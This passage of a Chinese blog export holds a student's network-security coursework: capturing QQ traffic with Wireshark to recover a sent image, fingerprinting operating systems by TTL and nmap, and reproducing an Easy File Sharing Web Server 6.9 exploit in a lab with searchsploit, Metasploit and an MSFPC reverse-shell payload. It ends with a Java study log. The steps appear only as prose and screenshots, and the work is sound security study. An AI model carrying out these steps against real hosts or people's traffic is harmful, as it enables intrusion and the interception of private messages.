<h4 id="抓取旧版QQ消息"><a href="#抓取旧版QQ消息" class="headerlink" title="抓取旧版QQ消息"></a>抓取旧版QQ消息</h4><p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/5.png" alt="5"></p>
<p>选取已连接的网卡，这里选取WLAN，输入oicq抓取qq流量数据。</p>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/7.png" alt="7"></p>
<p>此处可以看到相应的网络路由设备厂商，服务端口，网络协议，QQ号码等信息</p>
<p>发送一张png图片进行获取</p>
<p>选择tcp流查找png的16进制文件头：FFD8,右键追踪流并另存为xx.png,用winHex打开</p>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/8.png" alt="8"></p>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/9.png" alt="9"></p>
]]></content>
      <categories>
        <category>网络渗透测试基础知识</category>
      </categories>
      <tags>
        <tag>网络渗透测试基础知识,wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全测试课程-作业-5</title>
    <url>/2023/12/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-5/</url>
    <content><![CDATA[<h2 id="操作系统协议栈指纹"><a href="#操作系统协议栈指纹" class="headerlink" title="操作系统协议栈指纹"></a>操作系统协议栈指纹</h2><p>(Namp使用手册)[<a href="https://nmap.org/man/zh/man-port-scanning-techniques.html]">https://nmap.org/man/zh/man-port-scanning-techniques.html]</a></p>
<p>前置知识–主动扫描摘记（主动指纹识别是指主动往远程主机发送数据包并对相应的响应进行分析的过程，使扫描器在更短的时间内获得比被动扫描更准确的结果。）：</p>
<ul>
<li><p>网络层：ping命令，icmp协议，速度快(可跨网段)：防护墙可以静ping（检测报文中协议类型为01，即icmp协议便丢弃）。</p>
<ul>
<li>ping失败后，可查看arp缓存表(arp -a)是否存在mac地址(仅限同一个子网)</li>
</ul>
</li>
<li><p>运输层(TCP，UDP)：端口扫描，</p>
<ul>
<li>:one:TCP协议扫描，全连接扫描</li>
<li>:two:UDP协议扫描</li>
<li>:three: SYN扫描</li>
</ul>
</li>
</ul>
<p>系统的指纹实际上来源于TCP&#x2F;IP协议栈。TCP&#x2F;IP协议栈技术只是在RFC文档中描述，并没有一个统一的行业标准，各个公司在编写应用于自己的操作系统的TCP&#x2F;IP协议栈时，对RFC文档做出了不尽相同的诠释，造成了各个操作系统在TCP&#x2F;IP协议的实现上有所不同。通过比较不同的操作系统的TCP&#x2F;IP协议栈的细微差异，就可以判定操作系统类型及版本，这种方式也称为“指纹方法学”。</p>
<p>例如我们可以通过ping命令观测TLL值得大小来是否为windows和liunx系统。亦可以使用nmap扫描指定好参数就可以探别系统版本和信息。</p>
<ul>
<li><p>TTL即Time to live，是由发送数据包的计算机等设备设置的。数据包每次经过路由转发后，该值都会被减1，当TTL值变为0，该数据包便会被丢弃。</p>
<p>​			</p>
<ul>
<li><blockquote>
<p>常见系统的TTL值-&gt;实际探测会因为经过路由不断衰减而改变，但一般大致范围不会变(可计算)，不影响判断。</p>
<p>Windows 9x&#x2F;NT&#x2F;2000 Intel   128<br>Digital Unix 4.0 Alpha      60<br>Linux 2.2.x Intel         64<br>Netware 4.11 Intel         128</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>参考王轶骏，薛质，李建华的《<strong>基于TCP&#x2F;IP协议栈指纹辨识的远程操作系统探测</strong>》论文后可以得知：文章内容实现远程操作系统辨识的各种技术类型进行了概括（基于TCPP协议栈的指纹查询和辨识）</p>
<img src="/2023/12/04/网络安全测试课程-作业-5/undefined" alt="1" style="zoom: 67%;">

<blockquote>
<p>通过探测并仔细分析这些TCP&#x2F;IP协议栈指纹的细微差异，就能够精确地辨识出远程操作系统，这就是“栈指纹辨识”(Stack Fingerprinting)技术。最为经典的栈指纹辨识技术由Fydo提出，它通过构造并发送不同类型的数据包（既有正常的也有畸形的数据报）来收集并分析远端操作系统的响应，从而区别不同的TCPP协议栈。这一期间，还出现了基于初始序列号(ISN)采样的指纹辨识技术[)。这些技术都已在Nmp和Queso等经典的工具中得到了体现，在此就不再赘述。此后，真正在指纹辨识方法学上有所突破的则是以下两种：基于TO(重传超时时间)采样的辨识技术和基于引CMP响应的辨识技术。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--《基于TCP/IP协议栈指纹辨识的远程操作系统探测》</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="TCP-与-ICMP-指纹识别"><a href="#TCP-与-ICMP-指纹识别" class="headerlink" title="TCP 与 ICMP 指纹识别"></a><strong>TCP</strong> <strong>与</strong> <strong>ICMP</strong> <strong>指纹识别</strong></h3><p>对操作系统的扫描大多是通过TCP&#x2F;IP协议簇进行的。应因为TCP&#x2F;IP是互联网的基础协议，网络上所有的通信交互都通过该协议簇进行，所以操作系统OS想要与外界通信（这是必然的）一定要实现该协议。这些标记对操作系统特别重要，每个操作系统根据数据包的不同类型做出不同的反应，如果是TCP包就发送 到系统自己的网络栈。</p>
<p>ICMP协议也经常被用来进行指纹识别。许多traceroute功能使用ICMP协议发现起点到目标的网络路径。如果数据报没有被正确 处理，不管是设备没有激活还是数据报自己的问题，ICMP都会返回错误消息，这些错误消息有时也很有用。</p>
<h3 id="本机实验"><a href="#本机实验" class="headerlink" title="本机实验"></a>本机实验</h3><p>本机环境下的域下有多台靶机，实验使用kali,Ubuntu,windows7进行实验。</p>
<p><img src="/2023/12/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-5/1.png" alt="域环境"></p>
<p>ip地址分别win7:192.168.65.138,ubuntu:192.168.65.137</p>
<p>分别ping两台主机，得到结果：</p>
<p><img src="/2023/12/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-5/2.png" alt="ping实验"></p>
<p>可以看到win系统的TTL值为128，liunx（Ubuntu）系统的TTL值为：64.因为是本地主机并未经过路由，因此TTL并未减小。</p>
<p>使用TCP&#x2F;UDP进行路由追踪可以看到（未经过其他路由转发）：</p>
<img src="/2023/12/04/网络安全测试课程-作业-5/undefined" style="zoom:90%;">

<p>通过nmap扫描系统类型可以看到：</p>
<p><img src="/2023/12/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-5/4.png"></p>
<p>通过比较不同的操作系统的TCP&#x2F;IP协议栈的细微差异，可以识别出OS类型甚至是具体版本。</p>
]]></content>
  </entry>
  <entry>
    <title>网络测试-efssetup_20181复现</title>
    <url>/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<hr>
<hr>
<p>网络渗透实验复现作业-efssetup_20181复现</p>
<hr>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="环境梳理"><a href="#环境梳理" class="headerlink" title="环境梳理"></a>环境梳理</h4><ul>
<li>VM下windows10系统，ip：192.168.65.143</li>
<li>攻击机：VM下kali系统，ip：193.168.65.128，物理机windows11</li>
<li>靶机无使用杀毒软件</li>
</ul>
<h4 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h4><p>将插件下载至虚拟机，并双击exe程序进行安装</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B02B672F9-B19D-4e15-A58B-012EC8732A0E%7D.png" alt="安装界面"></p>
<p>等待安装完成后，修改url地址为本地使用IP地址，关闭80端口的其他服务，或者修改该程序的端口</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BFBD55C7F-8CD3-4180-B821-61B016F62E9F%7D.png" alt="端口修改"></p>
<p>确认windows防火墙开放了指定端口即可安装成功。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>1.kali下使用nmap进行扫描该ip,查看存在哪些服务</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B66592BA0-2F04-4927-8763-45ABDA87C5C1%7D.png" alt="扫描结果"></p>
<p>发现靶机开放了80端口，且部署的服务为 Easy File Sharing Web Server httpd 6.9</p>
<p>2.使用searchsploit搜索该服务</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BABE21C88-6327-457d-A299-0D4247460365%7D.png" alt="漏洞查询"></p>
<p>下载该脚本，直接利用（这里原本想使用6.9版本，但执行后一直被拒绝）</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BB582CCEB-F015-4677-8B54-194E1BD93ACB%7D.png" alt="脚本下载"></p>
<p>执行发现计算器已被弹起（这里的脚本为python2脚本，应使用python2）</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B4F5489B0-DB29-4a23-B7B7-953D0D92BE8E%7D.png" alt="脚本执行"></p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BC32B5177-E056-41a3-8EEB-4569FFAF1B26%7D.png" alt="执行结果"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>方法一只能实现固定程序或命令的执行，无法进行交互，因此可以使用msf进行漏洞利用拿到shell</p>
<p>1.搜索该服务</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B0E2456B0-6B35-4f08-BC1D-0E323F526ED3%7D.png" alt="漏洞搜索及设置"></p>
<p>设置好该漏洞，并进行执行，拿到shell</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BD09DB7DF-E243-4aa6-8499-1336DF3AC909%7D.png" alt="shell"></p>
<h4 id="生成主控端、被控端"><a href="#生成主控端、被控端" class="headerlink" title="生成主控端、被控端"></a>生成主控端、被控端</h4><p>这里使用MSFPC进行生成exe可执行程序进行控制</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B8FE1FCCB-22B3-4fa0-A131-775985D32D8E%7D.png" alt="使用步骤"></p>
<p>将可执行脚本上传到windows上并等待执行,使用msf进行上传</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/Users/a/AppData/Local/Temp/{42E5925B-E8B7-4ae2-AD0A-F1EF17536807}.png" alt="文件上传"></p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B2FCAEAF1-7169-42e5-A7D9-2BD063DD6360%7D.png" alt="上传成功"></p>
<p>kali进行监听443，windows进行执行，使用handler进行监听</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7B394200B4-6B9C-40bd-A0E9-5CD2413FD29B%7D.png" alt="参数设置"></p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BDD5C6A0F-417B-4fd0-856A-3350BE6DAE94%7D.png" alt="获得shell"></p>
<h4 id="随意下载文件"><a href="#随意下载文件" class="headerlink" title="随意下载文件"></a>随意下载文件</h4><p>例如下web.config到当前目录</p>
<p><img src="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95-efssetup-20181%E5%A4%8D%E7%8E%B0/%7BE8FBE2D7-45E7-4824-8DF3-B08C036E56A8%7D.png" alt="内容下载"></p>
<h3 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h3><ul>
<li><p>之前的python脚本和msf在进行攻击时存在机率是的服务崩溃（尤其是python脚本）</p>
</li>
<li><p>生成主控端、被控端，其实msf漏洞利用是实现获得shell但是通过handler再次获得是为了巩固学习</p>
</li>
<li><p>对于msfpc生成的脚本建议多次执行以防止连接失败</p>
</li>
<li><p>使用msf进行连接时，务必要关闭掉windwos10的实施监控，否则服务将会被删除或服务崩溃。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>网络渗透测试</category>
      </categories>
      <tags>
        <tag>easy file sharing server</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全学习打卡记录</title>
    <url>/2024/04/07/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%89%93%E5%8D%A1%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>2024.3.29 java资源查找</p>
<p>2024.4.5 java基础操作</p>
<p>2024.4.6，学习到了override和overload类</p>
<p>2024.4.8，在up主<strong>首席bug专家</strong>的java课程学习到了object对象 p78课时</p>
<p>2024.4.9，java课程学习到了封装  p82课时</p>
<p>2024.4.10 ，java课程学习到了多态，抽象，接口 p87课时</p>
<p>2024.4.11，java课程学习回顾</p>
<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><h3 id="SpringBoot学习"><a href="#SpringBoot学习" class="headerlink" title="SpringBoot学习"></a>SpringBoot学习</h3><p>2024.4.12，学习创建项目，hello world网站开始搭建和配置文件application.properties的认识</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
